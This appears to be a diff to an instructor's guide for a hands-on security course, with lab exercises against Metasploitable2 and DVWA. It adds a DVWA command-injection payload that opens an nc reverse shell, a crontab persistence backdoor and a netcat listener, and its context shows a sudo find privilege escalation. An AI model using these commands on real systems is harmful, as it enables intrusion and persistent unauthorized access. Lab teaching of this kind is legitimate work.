@@ -23,6 +23,19 @@ in *your unit*, and who you give keys to, is your problem — **shared responsib
 
 ---
 
+## Lab tool map (this day) — see also Day 13's full table
+
+| Target | Address | Tool | Technique |
+|---|---|---|---|
+| Metasploitable2 | `10.89.1.10` | Metasploit / manual + `linpeas.sh` | known-service exploit → shell → privilege escalation |
+| DVWA | `10.89.1.20` | manual (Command Injection page) + `nc` | web bug → reverse shell → planted backdoor/persistence |
+
+Path B is the fastest "a web bug becomes a backdoor" story in the course — the same DVWA
+Command Injection field from Day 16, now used to open a shell instead of just proving RCE.
+Use it as the whole DO if Metasploit setup is eating time.
+
+---
+
 ## Must-teach vs. cut-if-short
 
 **Never cut:**
@@ -187,7 +200,7 @@ in *your unit*, and who you give keys to, is your problem — **shared responsib
 Type the `id` → `sudo -l` → `sudo find . -exec /bin/sh \; -quit` → `#` sequence on any box
 where you've set `devuser ALL=(ALL) NOPASSWD: /usr/bin/find`. 20 seconds, huge impact.
 
-### Priv-esc DO on Metasploitable2
+### Priv-esc DO on Metasploitable2 (Path A — `10.89.1.10`)
 1. Shell from Day 15 (or `msfconsole` → a quick module).
 2. Host linpeas: on Kali `python3 -m http.server 8000` in the dir with `linpeas.sh`
    (Kali: `/usr/share/peass/linpeas/` or clone PEASS-ng). On target:
@@ -197,6 +210,14 @@ where you've set `devuser ALL=(ALL) NOPASSWD: /usr/bin/find`. 20 seconds, huge i
    `daemon` → then udev/`/etc/crontab` (world-writable, runs a script every minute → drop a
    reverse shell as root), NFS `no_root_squash`.
 5. `id` → `uid=0`. Screenshot start→command→root.
+
+### Web-shell + backdoor DO on DVWA (Path B — `10.89.1.20`)
+1. Attacker box: `nc -lvnp 4444`.
+2. DVWA Command Injection page: `127.0.0.1; nc -e /bin/sh 10.89.1.<attacker> 4444` (or the
+   `mkfifo`/`bash -i` form if `nc -e` isn't compiled in on the target).
+3. Listener catches a shell as `www-data`. That input box **is** the backdoor.
+4. Plant persistence: `(crontab -l; echo "* * * * * nc <attacker> 4445 -e /bin/sh") | crontab -`
+   — then **remove it** before moving on; note it in the journal instead of leaving it live.
 
 ### Policy DO
 Paper (`assets/*.json`). If LocalStack/MinIO is set up:
